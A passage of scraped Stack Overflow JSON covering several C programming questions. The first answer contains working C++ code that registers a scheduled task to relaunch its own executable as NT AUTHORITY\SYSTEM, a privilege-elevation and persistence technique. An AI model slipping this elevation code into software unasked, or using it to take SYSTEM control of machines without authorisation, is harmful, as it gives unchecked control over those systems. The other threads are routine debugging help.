project of mine and slightly modified:</p>\n\n<pre><code>#include &lt;Windows.h&gt;\n#include &lt;WinNls.h&gt;\n#include &lt;shobjidl.h&gt;\n#include &lt;objbase.h&gt;\n#include &lt;ObjIdl.h&gt;\n#include &lt;ShlGuid.h&gt;\n#include &lt;taskschd.h&gt;\n#include &lt;comdef.h&gt;\n#include &lt;strsafe.h&gt;\n\n#pragma comment(lib, \"taskschd.lib\")\n#pragma comment(lib, \"comsupp.lib\")\n\nHRESULT WINAPI CreateSchedTask(WCHAR *wszExePath)\n{\n    ITaskService *pService = NULL;\n    ITaskFolder *pRoot = NULL;\n    ITaskDefinition *pTask = NULL;\n    ITaskSettings *pSettings = NULL;\n    IRegistrationInfo *pInfo = NULL;\n    ITriggerCollection *pCollection = NULL;\n    ITrigger *pTrigger = NULL;\n    ITimeTrigger *pTime = NULL;\n    IPrincipal *pPrincipal = NULL;\n    IActionCollection *pActionCollection = NULL;\n    IAction *pAction = NULL;\n    IExecAction *pExecAction = NULL;\n    IRegisteredTask *pRegTask = NULL;\n    SYSTEMTIME stNow;\n    WCHAR wFmt[100];\n    VARIANT vBlank = _variant_t();\n\n    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);\n    //CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);\n    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID *)&amp;pService);\n\n    pService-&gt;Connect(vBlank, vBlank, vBlank, vBlank);\n    pService-&gt;GetFolder(SysAllocString(L\"\\\\\"), &amp;pRoot);\n    pService-&gt;NewTask(0, &amp;pTask);\n    pService-&gt;Release();\n\n    pTask-&gt;get_RegistrationInfo(&amp;pInfo);\n\n    pInfo-&gt;put_Author(SysAllocString(L\"TASKNAMEHERE\"));\n\n    pInfo-&gt;Release();\n\n    pTask-&gt;get_Settings(&amp;pSettings);\n    pSettings-&gt;put_StartWhenAvailable(VARIANT_TRUE);\n    pSettings-&gt;put_Enabled(VARIANT_TRUE);\n    pSettings-&gt;Release();\n\n    pTask-&gt;get_Triggers(&amp;pCollection);\n    pCollection-&gt;Create(TASK_TRIGGER_TIME, &amp;pTrigger);\n    pCollection-&gt;Release();\n    pTrigger-&gt;QueryInterface(IID_ITimeTrigger, (void **)&amp;pTime);\n\n    GetLocalTime(&amp;stNow);\n    // Note: replace -07:00 with the appropriate UTC offset for your time zone\n    StringCchPrintfW(wFmt, 100, L\"%.4hu-%.2hu-%.2huT%.2hu:%.2hu:%.2hu-07:00\", stNow.wYear, stNow.wMonth, stNow.wDay, stNow.wHour, stNow.wMinute, stNow.wSecond + 30);\n    pTime-&gt;put_StartBoundary(SysAllocString(wFmt));\n    StringCchPrintfW(wFmt, 100, L\"%.4hu-%.2hu-%.2huT%.2hu:%.2hu:%.2hu-07:00\", stNow.wYear, stNow.wMonth, stNow.wDay, stNow.wHour, stNow.wMinute + 1, stNow.wSecond);\n    pTime-&gt;put_EndBoundary(SysAllocString(wFmt));\n    pTime-&gt;put_Id(SysAllocString(L\"TimeTrigger\"));\n    pTime-&gt;Release();\n\n    pTask-&gt;get_Actions(&amp;pActionCollection);\n    pActionCollection-&gt;Create(TASK_ACTION_EXEC, &amp;pAction);\n    pActionCollection-&gt;Release();\n\n    pAction-&gt;QueryInterface(IID_IExecAction, (void **)&amp;pExecAction);\n    pAction-&gt;Release();\n\n    pExecAction-&gt;put_Path(SysAllocString(wszExePath));\n    pExecAction-&gt;Release();\n\n    pTask-&gt;get_Principal(&amp;pPrincipal);\n    pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST);\n    pPrincipal-&gt;put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);\n    pTask-&gt;put_Principal(pPrincipal);\n    pPrincipal-&gt;Release();\n\n    pRoot-&gt;RegisterTaskDefinition(\n        SysAllocString(L\"System Elevation\"),\n        pTask, TASK_CREATE_OR_UPDATE,\n        _variant_t(L\"NT AUTHORITY\\\\SYSTEM\"),\n        _variant_t(), TASK_LOGON_SERVICE_ACCOUNT,\n        _variant_t(L\"\"), &amp;pRegTask);\n\n    pRoot-&gt;Release();\n    pTask-&gt;Release();\n    pRegTask-&gt;Release();\n    CoUninitialize();\n\n    return S_OK;\n}\n\nINT APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, INT nShowCmd)\n{\n    WCHAR wUsername[100], wExePath[MAX_PATH];\n    GetEnvironmentVariableW(L\"USERNAME\", wUsername, 100);\n\n    if (!wcschr(wUsername, L'$'))\n    {\n        GetModuleFileNameW(hInstance, wExePath, MAX_PATH);\n        CreateSchedTask(wExePath);\n    }\n    else\n    {\n        // NOTE: MessageBox and other GUI functions won't work since the process isn't running in winsta0\\default\n        // File I/O instead\n        HANDLE hLog = CreateFileW(L\"C:\\\\Temp\\\\Log.txt\", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n        DWORD dwWritten;\n        UINT uLen;\n        CHAR szBuf[100];\n        SetFilePointer(hLog, 0, NULL, FILE_END);\n        StringCchPrintfA(szBuf, 100, \"Hello from NT AUTHORITY\\\\SYSTEM\\r\\n\", wUsername);\n        StringCbLengthA(szBuf, 100, &amp;uLen);\n        WriteFile(hLog, szBuf, uLen, &amp;dwWritten, NULL);\n        CloseHandle(hLog);\n            }\n    return 0;\n}\n</code></pre></li>\n<li><p>Use the Windows Process API to elevate to System. I don't have much in the way of example code for this, but you can look at <a href=\"https://github.com/poweradminllc/PAExec\" rel=\"nofollow noreferrer\">PAExec</a>, an open source alternative to SysInternals PSExec tool, that allows creating new interactive processes as System.</p></li>\n<li><p>The idiomatic way of doing this on Windows, which is create a Windows service.</p></li>\n</ol>\n"}], "owner": {"reputation": 45, "user_id": 3725519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b735fb111d7af9bc39d7b79c88eec1e?s=128&d=identicon&r=PG&f=1", "display_name": "user3725519", "link": "https://stackoverflow.com/users/3725519/user3725519"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1542221890, "creation_date": 1542218970, "question_id": 53306380, "link": "https://stackoverflow.com/questions/53306380/program-escalates-itself-from-admin-to-system", "title": "Program escalates itself from admin to system", "body": "<p>I wrote a program that needs to be running as SYSTEM. I add the linker option 'UAC Execution Level' to 'requireAdministrator' and it pops the UAC like it should but now I need to escalate from admin to SYSTEM how can I do that?\nI thought about opening the program's token and inject it the SYSTEM token but it is not legit way. How can I do it neatly because I know once you admin you can be SYSTEM.</p>\n"}, {"tags": ["c", "buffer", "implementation", "tail"], "comments": [{"owner": {"reputation": 1684, "user_id": 4669135, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d9d4ff76c8827f4adfc6218ba952aefc?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Devillers", "link": "https://stackoverflow.com/users/4669135/gabriel-devillers"}, "edited": false, "score": 0, "creation_date": 1542219048, "post_id": 53306320, "comment_id": 93493394, "body": "You should try to compile in debug mode (<code>-g</code> on gcc,clang) with not optimizations (<code>-O0</code> on gcc,clang) and run you program using valgrind"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1542219978, "post_id": 53306320, "comment_id": 93493850, "body": "You should start by enabling compiler warnings (<code>-Wall -Wextra -Wpedantic</code> on gcc or clang, also set the compiler to optimize <code>-O3</code>). If you can, enable <code>-fsanitize=address</code> and other sanitizers, once the code compiles without warnings."}, {"owner": {"reputation": 1, "user_id": 10653549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e231a13e55503238040334a52dfbb727?s=128&d=identicon&r=PG&f=1", "display_name": "Sheepp", "link": "https://stackoverflow.com/users/10653549/sheepp"}, "edited": false, "score": 0, "creation_date": 1542220637, "post_id": 53306320, "comment_id": 93494158, "body": "there is no memory allocation. I do not quite know why, if it&#39;s malloc."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1542221391, "post_id": 53306320, "comment_id": 93494535, "body": "@Sheepp How do you know there is no memory allocation?"}, {"owner": {"reputation": 1, "user_id": 10653549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e231a13e55503238040334a52dfbb727?s=128&d=identicon&r=PG&f=1", "display_name": "Sheepp", "link": "https://stackoverflow.com/users/10653549/sheepp"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1542221548, "post_id": 53306320, "comment_id": 93494598, "body": "@EOF From valgrind. There is an information about 0 allocs and 0 frees."}, {"owner": {"reputation": 810, "user_id": 6454387, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/836f5a3c702c54cee8bffccf5a61916c?s=128&d=identicon&r=PG&f=1", "display_name": "ljeabmreosn", "link": "https://stackoverflow.com/users/6454387/ljeabmreosn"}, "edited": false, "score": 0, "creation_date": 1542222222, "post_id": 53306320, "comment_id": 93494937, "body": "How are you compiling? <code>argv &lt; MAXLINES</code> is a comparison between a pointer and an integer. What is the exit code of the program? If it is <code>255</code>, then your code is probably returning <code>-1</code> from <code>main</code>."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1542222423, "post_id": 53306320, "comment_id": 93495025, "body": "@Sheepp You should not run the program under valgrind until the compile succeeds without warnings, with warnings enabled."}, {"owner": {"reputation": 1, "user_id": 10653549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e231a13e55503238040334a52dfbb727?s=128&d=identicon&r=PG&f=1", "display_name": "Sheepp", "link": "https://stackoverflow.com/users/10653549/sheepp"}, "reply_to_user": {"reputation": 810, "user_id": 6454387, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/836f5a3c702c54cee8bffccf5a61916c?s=128&d=identicon&r=PG&f=1", "display_name": "ljeabmreosn", "link": "https://stackoverflow.com/users/6454387/ljeabmreosn"}, "edited": false, "score": 0, "creation_date": 1542234828, "post_id": 53306320, "comment_id": 93500309, "body": "@ljeabmreosn Yes, I noticed that. I pasted the previous version."}], "owner": {"reputation": 1, "user_id": 10653549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e231a13e55503238040334a52dfbb727?s=128&d=identicon&r=PG&f=1", "display_name": "Sheepp", "link": "https://stackoverflow.com/users/10653549/sheepp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 644, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1542218702, "creation_date": 1542218702, "question_id": 53306320, "link": "https://stackoverflow.com/questions/53306320/tail-c-linux-command-implementation-in-c", "title": "Tail -c linux command implementation in C", "body": "<p>I need to write a tail in C language, where the input stream will be the argument in the console. The function should cut n characters from the input data. The command calling the program should be \"echo\" an example text \"| ./a.out 4\" - that is, the last 4 characters of the given input will be printed.\nUnfortunately, my function does not print anything to me.\nThanks in advance. If there are any other, smarter solutions then I am open to suggestions.</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define BUFFSIZE 1024\n#define MAXLINES 100\n\n\nchar* tailFunction (const char* argv[])\n{\n        char* buf, data;\n        int n = 0, i =0;\n        buf = malloc(sizeof(char) * MAXLINES);\n        n = atoi(argv[0]+1);\n        while (data != EOF)\n        {\n            data = getc(stdin);\n            buf[i] = data;\n            i++;\n\n        }\n        int x = strlen(buf) - n;\n        for ( ; x &lt; strlen(buf) ; x++)\n        {\n            printf(\"%c\", buf[x]);\n        }\n\n        free(buf);\n        return 0;\n\n\n}\nint main(int argc, const char *argv[])\n{\n    if (argc !=2)\n    {\n        return -1;\n    }\n    if (argv &lt; MAXLINES)\n    {\n    tailFunction(argv);\n    return 0;\n    }\n    else return -1;\n}\n</code></pre>\n"}, {"tags": ["c", "stat", "localtime"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1542218858, "post_id": 53306290, "comment_id": 93493320, "body": "Have you set the locale? By default, it works in the C locale.  Perhaps <code>setlocale(LC_TIME, \u201c\u201d);</code>?  Failing that, you can add the dot to the format string, but that won\u2019t fix the case of the abbreviation."}, {"owner": {"reputation": 71, "user_id": 3592221, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d81b56801f7c0b155ef6786dc204f4cd?s=128&d=identicon&r=PG&f=1", "display_name": "user3592221", "link": "https://stackoverflow.com/users/3592221/user3592221"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542219127, "post_id": 53306290, "comment_id": 93493435, "body": "It works ! Thanks !"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1542238104, "post_id": 53306290, "comment_id": 93501364, "body": "@user3592221: when you receive a useful answer to a question, you should <a href=\"https://stackoverflow.com/help/someone-answers\">accept</a> the answer so that other people know that it no longer needs to be answered."}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 0, "last_activity_date": 1542271802, "last_edit_date": 1542271802, "creation_date": 1542220408, "answer_id": 53306690, "question_id": 53306290, "link": "https://stackoverflow.com/questions/53306290/how-to-change-month-format-for-ls-l-custom-command/53306690#53306690", "title": "How to change month format for ls -l custom command", "body": "<p>By default, C programs run with the C locale.  It looks as though you want a different locale, so use the <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/setlocale.html\" rel=\"nofollow noreferrer\"><code>setlocale()</code></a> function with another locale.  The simplest is specified by the empty string. (<em>A value of \"C\" for locale specifies the minimal environment for C translation; a value of \"\" for locale specifies the locale-specific native environment. Other implementation-defined strings may be passed as the second argument to setlocale.</em>):</p>\n\n<pre><code>setlocale(LC_TIME, \u201c\u201d);\n</code></pre>\n\n<p>This only affects time; you could use <code>LC_ALL</code> to change everything. </p>\n"}], "owner": {"reputation": 71, "user_id": 3592221, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d81b56801f7c0b155ef6786dc204f4cd?s=128&d=identicon&r=PG&f=1", "display_name": "user3592221", "link": "https://stackoverflow.com/users/3592221/user3592221"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 53306690, "answer_count": 1, "score": 0, "last_activity_date": 1542271802, "creation_date": 1542218597, "question_id": 53306290, "link": "https://stackoverflow.com/questions/53306290/how-to-change-month-format-for-ls-l-custom-command", "title": "How to change month format for ls -l custom command", "body": "<p>When you make this command :</p>\n\n<pre><code>find ok/ -exec ls -l -d {} \\;\n</code></pre>\n\n<p>The terminal displays :</p>\n\n<pre><code>drwxrwxrwx 2 alexia alexia 4096 8 oct.  15 22:31 ok/\n</code></pre>\n\n<p>I tried to make my own find command to do the same thing with stat.h :</p>\n\n<pre><code>[...] //Other file information\nstruct stat fileStat;\nstat(path,&amp;fileStat)\nchar buffer[20];\nstruct tm *time\ntime = localtime(&amp;(fileStat.st_mtime));\nstrftime(buffer, 20, \"%b %e  %Y\", time);\nprintf(\"%s\", buffer);\n</code></pre>\n\n<p>and it displays:</p>\n\n<pre><code>[...]\n8 Oct  15 22:31 ok/\n</code></pre>\n\n<p>The month format is not good, and I do no know how to get it right. </p>\n\n<p>Cheers</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1542218638, "post_id": 53306264, "comment_id": 93493237, "body": "When you say <i>This doesnt work properly:</i>, this is rather unspecific. Please, describe instead: What is expected (and why). What did you get instead."}, {"owner": {"reputation": 5181, "user_id": 5529197, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6af647bacfb3f0b596c73b0e3b0dc4b1?s=128&d=identicon&r=PG&f=1", "display_name": "Afshin", "link": "https://stackoverflow.com/users/5529197/afshin"}, "edited": false, "score": 4, "creation_date": 1542218686, "post_id": 53306264, "comment_id": 93493256, "body": "why you are calculating before reading from input?"}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1542218705, "post_id": 53306264, "comment_id": 93493263, "body": "Btw. your computation is done before you read the input values. You should re-order your code. As it is, it surely cannot work properly."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1542218869, "post_id": 53306264, "comment_id": 93493325, "body": "In general, you can assume that your code in <code>main()</code> is executed from top to bottom. (That&#39;s why, C is counted as imperative language with defined control flow.) Nowadays, there are lots of discussions about re-ordering in generated code. However, every re-ordering the compiler may do for optimization may not violate your model from top to bottom execution. (roughly described)"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1542219168, "post_id": 53306264, "comment_id": 93493461, "body": "See <a href=\"https://stackoverflow.com/a/53238897/1848654\">stackoverflow.com/a/53238897/1848654</a>."}], "answers": [{"tags": [], "owner": {"reputation": 1118, "user_id": 2191849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fOaLe.jpg?s=128&g=1", "display_name": "static_cast", "link": "https://stackoverflow.com/users/2191849/static-cast"}, "is_accepted": false, "score": 1, "last_activity_date": 1542223150, "last_edit_date": 1542223150, "creation_date": 1542221701, "answer_id": 53306997, "question_id": 53306264, "link": "https://stackoverflow.com/questions/53306264/calculate-with-double-float-variables/53306997#53306997", "title": "calculate with double / float variables", "body": "<pre><code>double tax_d = (amount * interest_rate) / 100;\nfloat tax_f = (amount * interest_rate) / 100;\n</code></pre>\n\n<p>These lines of code need to execute (be placed) after <code>amount</code> and <code>interest_rate</code> have been read and populated with user data</p>\n\n<p>Specifically after these 2 lines:    </p>\n\n<pre><code>scanf(\"%lf\" , &amp;amount);\nscanf(\"%lf\", &amp;interest_rate);\n</code></pre>\n\n<p>It would also be good practice to initialize those values (i.e. <code>double amount = 0</code> and <code>double interest_rate = 0</code>) upon their declaration..</p>\n\n<p>*For future reference: Edit the question to be more specific as to what your inputs are and what you were expecting as output. This helps the community in driving to what the problem is and the solution.</p>\n"}], "owner": {"reputation": 31, "user_id": 9056149, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf141258e3d89cae96fa9a1668d17b73?s=128&d=identicon&r=PG&f=1", "display_name": "marinator", "link": "https://stackoverflow.com/users/9056149/marinator"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 196, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1542223150, "creation_date": 1542218484, "last_edit_date": 1542218559, "question_id": 53306264, "link": "https://stackoverflow.com/questions/53306264/calculate-with-double-float-variables", "title": "calculate with double / float variables", "body": "<p>It is really basic stuff, im just stuck and cant procede.</p>\n\n<p>Im trying following calculation, but it just wont work: </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main(){\n\n    double amount;\n    double interest_rate;\n\n    double tax_d = (amount * interest_rate) / 100;\n    float tax_f = (amount * interest_rate) / 100;\n\n\n    printf(\"\\n write amount: \");\n    scanf(\"%lf\" , &amp;amount);\n    printf(\"\\n write interest rate: \");\n    scanf(\"%lf\", &amp;interest_rate);\n    printf(\"Tax (double) : %lf\\n\" , tax_d);\n    printf(\"Tax (float) : %lf\\n\" , tax_f);\n\n\n    return 0;\n\n}\n</code></pre>\n\n<p>This doesnt work properly:</p>\n\n<pre><code>double tax_d = (amount * interest_rate) / 100;\nfloat tax_f = (amount * interest_rate) / 100;\n</code></pre>\n\n<p>Any help will be appreciated.</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 4547, "user_id": 446792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/U1Hrx.jpg?s=128&g=1", "display_name": "mx0", "link": "https://stackoverflow.com/users/446792/mx0"}, "edited": false, "score": 3, "creation_date": 1542215658, "post_id": 53305488, "comment_id": 93491837, "body": "Don&#39;t post code as image."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1542215663, "post_id": 53305488, "comment_id": 93491839, "body": "Please don&#39;t post pictures of text but post text as text. Take the <a href=\"https://stackoverflow.com/tour\">tour</a> and read this: <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> ans this: <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1542216456, "post_id": 53305488, "comment_id": 93492238, "body": "<code>for (*pt=0 ; *pt != &#39;\\0&#39; ; *pt++)</code> --&gt; <code>for ( ; pt; pt++)</code>. Also, use <a href=\"https://linux.die.net/man/3/fgets\" rel=\"nofollow noreferrer\"><code>fgets</code></a> instead of <code>gets</code>, which is a security vulnerability."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542217150, "post_id": 53305488, "comment_id": 93492611, "body": "See <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-dangerous-why-should-it-not-be-used\">Why is the <code>gets()</code> function too dangerous to be used \u2014 ever!</a>"}], "answers": [{"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 2, "last_activity_date": 1542216654, "creation_date": 1542216654, "answer_id": 53305792, "question_id": 53305488, "link": "https://stackoverflow.com/questions/53305488/problem-while-printing-string-using-pointers-in-c-programming/53305792#53305792", "title": "Problem while printing string using Pointers in C Programming", "body": "<p>The initialization <code>*pt = 0;</code> is causing the continuation test <code>*pt != 0</code> to fail immediately, so your loop stops before printing anything.</p>\n\n<p>You already initialized <code>pt</code> before the loop, so you don't need that step in the <code>for()</code> header. And you should be incrementing the pointer, not the character that it points so, so the update should be <code>pt++</code>.</p>\n\n<pre><code>for (; *pt != '\\0'; pt++) {\n    printf(\"%c\", *pt);\n}\n</code></pre>\n\n<p>BTW, <code>ptr = &amp;str[0];</code> can be simplified to just <code>ptr = str;</code>. It's also more idiomatic to put this in the <code>for</code> header, so it would be:</p>\n\n<pre><code>for (pt = str; *pt != '\\0'; pt++)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 1, "last_activity_date": 1542216855, "creation_date": 1542216855, "answer_id": 53305848, "question_id": 53305488, "link": "https://stackoverflow.com/questions/53305488/problem-while-printing-string-using-pointers-in-c-programming/53305848#53305848", "title": "Problem while printing string using Pointers in C Programming", "body": "<p>First - <strong>NEVER NEVER NEVER</strong> use <code>gets</code>, not even in toy code.  It was deprecated in the 1999 standard and has been removed from the standard library as of the 2011 standard.  It <em>will</em> introduce a point of failure / major security hole in your code.  Use <code>fgets</code> instead, just be aware it will store the newline to your buffer if there's room.  </p>\n\n<p>Restructure your <code>for</code> statement as follows:</p>\n\n<pre><code>for ( pt = str; *pt != '\\0'; pt++ )\n</code></pre>\n\n<p>The first expression sets <code>pt</code> to point to the first character in <code>str</code> (in this context, <code>str</code> is equivalent to <code>&amp;str[0]</code>).  The second compares the <em>value</em> of the element that <code>pt</code> points to against the string terminator.  Since you are trying to check the value of the pointed-to object, you must use the <code>*</code> operator to deference <code>pt</code>.  The final expression advances <code>pt</code> to point to the next character in the string.</p>\n\n<p>Finally, is there a reason you're printing the string out character by character instead of just writing <code>printf( \"%s\\n\", str );</code> ?</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9929640"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1542216994, "creation_date": 1542215539, "last_edit_date": 1542216994, "question_id": 53305488, "link": "https://stackoverflow.com/questions/53305488/problem-while-printing-string-using-pointers-in-c-programming", "title": "Problem while printing string using Pointers in C Programming", "body": "<p>Respected Experts , </p>\n\n<p>I am a newbie to C programming Language . </p>\n\n<p>I am trying to print a string in C Language . The code runs successfully but when i\nenter the string , it does not displays the string entered by the user in return </p>\n\n<p>I have attached the screenshot of the code which I am trying to execute . </p>\n\n<p>Please help me out . </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main()\n{\n    char str[20];\n    char *pt;\n\n    printf(\"Enter any string :\\n\");\n    gets(str);\n    pt=&amp;str[0];\n\n    for(*pt=0; *pt != '\\0'; *pt++)\n    {\n        printf(\"%c\", *pt);\n    }\n}\n</code></pre>\n"}, {"tags": ["python", "c", "linux", "pty"], "answers": [{"comments": [{"owner": {"reputation": 7687, "user_id": 3220983, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ypq01.jpg?s=128&g=1", "display_name": "BuvinJ", "link": "https://stackoverflow.com/users/3220983/buvinj"}, "edited": false, "score": 0, "creation_date": 1542239292, "post_id": 53310273, "comment_id": 93501712, "body": "Thanks for the help!  You are essentially correct.  I have now figured it out finally (before seeing your answer).  I do want to use non-block and on both ends so I can read and write asynchronously.  I&#39;ve included that in my fixed version, but the primary hangup was in the pty settings.  I&#39;m quite sure you are correct regarding how minicom switched to &quot;raw&quot; mode.  I found that I could get this to work by reconfiguring such on either end of producer/consumer pair.  So, I did so on the producer end since I don&#39;t want a mess on the client side."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 7687, "user_id": 3220983, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ypq01.jpg?s=128&g=1", "display_name": "BuvinJ", "link": "https://stackoverflow.com/users/3220983/buvinj"}, "edited": false, "score": 0, "creation_date": 1542239513, "post_id": 53310273, "comment_id": 93501776, "body": "@BuvinJ: Fair enough.  But you&#39;ll need to set up some kind of event loop (or use some kind of event library) 